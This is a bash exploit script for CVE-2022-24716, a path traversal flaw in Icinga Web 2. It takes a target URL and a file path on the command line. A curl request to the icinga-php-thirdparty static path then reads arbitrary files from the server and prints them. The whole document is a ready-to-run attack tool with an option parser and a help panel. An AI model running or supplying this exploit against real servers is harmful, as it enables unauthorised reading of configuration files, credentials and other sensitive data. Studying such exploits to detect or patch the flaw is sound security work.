#!/bin/bash

# |CVE-2022-24716|
# ----------------
# Description: Path traversal vulnerability (Requests to paths starting with lib/ handled by StaticController)
# Author: Marss
# Date: 11 Aug, 2023


# Ctrl + C
# (function)
signal_handler(){
    echo -e "\n[!] User aborted."
    exit 1
}
# (signal)
trap signal_handler SIGINT

# Help panel
help_panel(){
    echo -e "\n|CVE-2022-24716|"
    echo
    echo -e "[*] Usage: $0 -t <target> -f <file_to_read>"
}

# Get file
get_file(){
    data=$(/usr/bin/curl -s $target_url/icingaweb2/lib/icinga/icinga-php-thirdparty$file_path)
    echo "$data"
}

# Main flow

# No Arguments
if [ "$#" -eq 0 ]; then
    help_panel
    exit 1
fi

while getopts ":ht:f:" opt
do
    case $opt in
        h) 
            help_panel
            exit 0;;
        t) 
            target_url=$OPTARG;;
        f)
            file_path=$OPTARG;;
        \?)
            echo -e "\n[x] Error: Invalid option."
            exit 1;;
    esac
done

file_content=$(get_file)
echo -e "\n[+] $file_path:\n$file_content"